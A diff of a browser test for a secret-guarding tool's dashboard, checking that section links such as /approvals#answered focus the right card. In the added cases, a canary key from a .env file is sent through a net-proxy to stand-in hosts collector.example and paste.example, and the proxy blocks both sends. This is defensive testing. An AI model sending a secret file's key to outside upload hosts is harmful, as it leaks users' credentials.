@@ -1,6 +1,7 @@
 /**
- * section-links.test — an address that names a card of Rules or Settings
- * (`/rules#who`, `/settings#prompt-filters`) opens the PRODUCT page at that
+ * section-links.test — an address that names a card of Approvals, Rules or
+ * Settings (`/approvals#answered`, `/rules#who`, `/settings#prompt-filters`)
+ * opens the PRODUCT page at that
  * card, its heading at the top of the window and focused, in a real headless
  * Chromium over the REAL components (dashboard.md §4.25 *Section links*).
  * Mandu-new.
@@ -22,7 +23,16 @@
  *   L2  the row of links under each title is in the page's flow (never
  *       sticky or fixed), a link per card (five on Rules, seven on Settings
  *       since About, 2026-10-20), inside the page's width;
- *   L3  the oracle: no page carries the registered key or a token.
+ *   L3  the oracle: no page carries the registered key or a token;
+ *   L4  Approvals (2026-10-23), with the net-proxy on its production client
+ *       having stopped two sends of a registered file's key, one answered
+ *       Block over the real route: `/approvals#answered` lands on Answered
+ *       earlier, its heading focused and in view, four links in the row
+ *       (no Keys Mandu found, no rule change asked for, no Rule changes:
+ *       their lists are hidden, so are their links, and no "·" ends the
+ *       row);
+ *   L5  `/approvals#rule-changes` with no rule change opens the page at its
+ *       top, no list's heading focused.
  *
  * Self-SKIPs without a Chromium (scripts/tour-screenshots.mjs probeBrowser:
  * MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell, or one on
@@ -31,17 +41,21 @@
 import { test, after } from "node:test";
 import assert from "node:assert/strict";
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { request as httpRequest } from "node:http";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath, pathToFileURL } from "node:url";
 
 import { ArbiterServer } from "../../arbiter/ipc/server.js";
 import { ArbiterClient } from "../../arbiter/ipc/client.js";
+import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
+import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
+import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
 import { NO_ADMIN_LAYER, setAdminLayer } from "../../arbiter/policy/admin-layer.js";
 import { makeApprovalsArbiter } from "../../dashboard/src/arbiter-adapter.js";
 import { DashboardServer } from "../../dashboard/src/server.js";
 import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
-import { ADMIN_COOKIE, ADMIN_OPTS } from "../../dashboard/test/unit/admin-session.js";
+import { ADMIN_COOKIE, ADMIN_OPTS, CSRF_ADMIN } from "../../dashboard/test/unit/admin-session.js";
 import { stateAxes } from "../lib/axes.js";
 import { humanSockIn } from "../lib/human-plane.js";
 
@@ -59,7 +73,27 @@ const tour = (await import(pathToFileURL(join(REPO, "scripts", "tour-screenshots
 };
 const browser = tour.probeBrowser({});
 
-const KEY = "sk_live_sectionLinksRegisteredCanary0000001";
+const KEY = "sk_" + "live_sectionLinksRegisteredCanary0000001";
+/** The file key the net-proxy stops twice (L4, L5). */
+const FILE_KEY = "sk_" + "live_sectionLinksApprovalsCanary000002";
+const SESSION = "1791500000-062";
+/** One absolute-form request through the forward proxy. */
+function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
+  const u = new URL(url);
+  return new Promise((resolve, reject) => {
+    const req = httpRequest(
+      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
+      (res) => {
+        const chunks: Buffer[] = [];
+        res.on("data", (c) => chunks.push(c));
+        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
+        res.on("error", reject);
+      },
+    );
+    req.on("error", reject);
+    req.end(body);
+  });
+}
 const RULES = 6;
 const VIEWS = [
   { width: 1280, height: 800, mobile: false },
@@ -73,7 +107,7 @@ const CASES = [
   { path: "/settings#about", page: "settings", card: "settings-about-block", head: "settings-about-title", links: 7 },
 ];
 
-test("an address naming a card of Rules or Settings opens there, its heading focused at the top, in a real Chromium over the real arbiter; no value on the page", {
+test("an address naming a card of Approvals, Rules or Settings opens there, its heading focused at the top, in a real Chromium over the real arbiter; no value on the page", {
   skip: browser ? false : "no Chromium found (MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell)", timeout: 180_000,
 }, async () => {
   const tmp = mkdtempSync(join(tmpdir(), "mandu-section-links-"));
@@ -94,6 +128,20 @@ test("an address naming a card of Rules or Settings opens there, its heading foc
   await arbiter.listen();
   const data = new ArbiterClient(socketPath);
   await data.connect();
+  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
+  const netClient = new ArbiterClient(socketPath);
+  await netClient.connect();
+  const netHuman = new ArbiterClient(humanPath);
+  const wire: string[] = [];
+  const proxy = new NetProxy({
+    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
+    sessionId: SESSION,
+    forwarder: async ({ url }) => { wire.push(url); throw new Error("a stopped send must never be forwarded"); },
+    log: () => {},
+  });
+  const proxyPort = await proxy.listen(0);
+  const admin = new ArbiterClient(adminSock);
+  await admin.connect();
   const wired = await makeApprovalsArbiter(socketPath, () => ({ socketPath: adminSock }));
   assert.ok(wired?.policyDoc, "the production adapter has the policy surface");
   const dashboard = new DashboardServer({
@@ -165,16 +213,97 @@ test("an address naming a card of Rules or Settings opens there, its heading foc
       }
     }
 
+    // ── L4, L5: Approvals ───────────────────────────────────────────────────
+    // Two stopped sends of a file's key, to two hosts: one answered Block
+    // over the real route, one waiting.
+    const env = join(home, "shop", ".env");
+    mkdirSync(dirname(env), { recursive: true });
+    writeFileSync(env, `SHOP_KEY=${FILE_KEY}\n`);
+    const reg = await data.registerSecret({ path: env, sessionKey: SESSION });
+    const sym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.SHOP_KEY/.exec(reg.twin ?? "")?.[0];
+    assert.ok(sym, `the key has its own symbol: ${JSON.stringify(reg)}`);
+    for (const host of ["collector.example", "paste.example"]) {
+      const stopped = await viaProxy(proxyPort, `http://${host}/upload`, `k=${sym}`);
+      assert.equal(stopped.status, 403, `the send to ${host} is stopped: ${stopped.body}`);
+    }
+    assert.deepEqual(wire, [], "nothing left the machine");
+    const pending = await admin.egressApprovals("pending");
+    assert.equal(pending.length, 2, "one question per send");
+    const block = await pageFetch(`${base}/api/egress/approvals/${pending[0].id}/deny`, { method: "POST", headers: CSRF_ADMIN });
+    assert.equal(block.status, 200, "answered Block over the real route");
+    const ANSWERED_HEAD = "document.querySelector('#approvals-answered-block h2')";
+    const drawn = "document.querySelectorAll('#approvals-waiting .ask').length === 1 && document.querySelectorAll('#approvals-answered .row.answered').length === 1";
+    for (const view of VIEWS) {
+      await s("Emulation.setDeviceMetricsOverride", { width: view.width, height: view.height, deviceScaleFactor: 1, mobile: view.mobile });
+      // L4
+      let what = `/approvals#answered at ${view.width} px`;
+      await s("Page.navigate", { url: base + "/approvals#answered" });
+      let landed = false;
+      for (const end = Date.now() + 30_000; Date.now() < end; await new Promise((r) => setTimeout(r, 150))) {
+        try { landed = await evaluate(`document.readyState === "complete" && ${drawn} && document.activeElement === ${ANSWERED_HEAD}`); } catch { /* navigating */ }
+        if (landed) break;
+      }
+      assert.ok(landed, `${what}: a waiting question and an answer drawn, Answered earlier's heading took the focus`);
+      await evaluate("new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(() => r(true), 300))))");
+      const m = await evaluate(`(() => {
+        const card = document.getElementById('approvals-answered-block');
+        const head = ${ANSWERED_HEAD};
+        const nav = document.querySelector('#page-approvals .page-head nav.section-links');
+        const max = document.scrollingElement.scrollHeight - innerHeight;
+        const ch = card.getBoundingClientRect(), hh = head.getBoundingClientRect();
+        return {
+          top: Math.round(ch.top), scrollY: Math.round(scrollY), max: Math.round(max), innerHeight,
+          headTop: Math.round(hh.top), headBottom: Math.round(hh.bottom),
+          focused: document.activeElement === head, address: location.pathname + location.hash,
+          navPosition: getComputedStyle(nav).position,
+          links: [...nav.querySelectorAll('li')].filter((li) => getComputedStyle(li).display !== 'none').map((li) => li.querySelector('a').dataset.section),
+          dots: [...nav.querySelectorAll('li')].filter((li) => getComputedStyle(li).display !== 'none').map((li) => getComputedStyle(li, '::after').content),
+          navOver: Math.round(nav.scrollWidth - nav.clientWidth), pageOver: Math.round(document.scrollingElement.scrollWidth - innerWidth),
+          text: document.body.innerText,
+        };
+      })()`);
+      pages.push(m.text);
+      assert.equal(m.focused, true, `${what}: its heading keeps the focus`);
+      assert.equal(m.address, "/approvals#answered", `${what}: the address keeps its hash`);
+      assert.ok(Math.abs(m.top) <= 1 || m.scrollY >= m.max - 1, `${what}: the list is at the top, or the page at its end (${JSON.stringify({ top: m.top, scrollY: m.scrollY, max: m.max })})`);
+      assert.ok(m.headTop >= 0 && m.headBottom <= m.innerHeight, `${what}: the heading is in view (${m.headTop}–${m.headBottom} of ${m.innerHeight})`);
+      assert.equal(m.navPosition, "static", `${what}: the row is in the page's flow`);
+      assert.deepEqual(m.links, ["waiting", "answered"], `${what}: a link per list shown, none to a hidden one`);
+      assert.deepEqual(m.dots, ['"·"', "none"], `${what}: a "·" between the links shown, none after the last`);
+      assert.ok(m.navOver <= 0 && m.pageOver <= 0, `${what}: the row wraps inside the page (${m.navOver}, ${m.pageOver})`);
+      // L5: no rule change, so Rule changes is hidden and its address opens the top.
+      what = `/approvals#rule-changes at ${view.width} px`;
+      await s("Page.navigate", { url: base + "/approvals#rule-changes" });
+      let read = false;
+      for (const end = Date.now() + 30_000; Date.now() < end; await new Promise((r) => setTimeout(r, 150))) {
+        try { read = await evaluate(`document.readyState === "complete" && ${drawn}`); } catch { /* navigating */ }
+        if (read) break;
+      }
+      assert.ok(read, `${what}: the page has read`);
+      // Long enough for Rule changes' read and a landing, had there been one.
+      await evaluate("new Promise((r) => setTimeout(() => requestAnimationFrame(() => requestAnimationFrame(() => r(true))), 1000))");
+      const t = await evaluate(`({ scrollY: Math.round(scrollY), hidden: document.getElementById('approvals-rule-history-block').hidden, focus: document.activeElement?.tagName, text: document.body.innerText })`);
+      pages.push(t.text);
+      assert.equal(t.hidden, true, `${what}: no rule change, so the list is hidden`);
+      assert.equal(t.scrollY, 0, `${what}: the page at its top`);
+      assert.notEqual(t.focus, "H2", `${what}: no list's heading took the focus`);
+    }
+
     // L3: the oracle.
-    assert.equal(pages.length, VIEWS.length * CASES.length, "every page was read");
+    assert.equal(pages.length, VIEWS.length * (CASES.length + 2), "every page was read");
     for (const p of pages) {
       assert.ok(!p.includes(KEY), "no page carries the registered key");
+      assert.ok(!p.includes(FILE_KEY), "nor the file's key");
       assert.doesNotMatch(p, /\$MDU/, "nor a token");
     }
   } finally {
     cdp.close();
     await tour.stopProc(proc);
     await dashboard.close();
+    await proxy.close();
+    netClient.close();
+    netHuman.close();
+    admin.close();
     data.close();
     await arbiter.close();
     rmSync(tmp, { recursive: true, force: true });
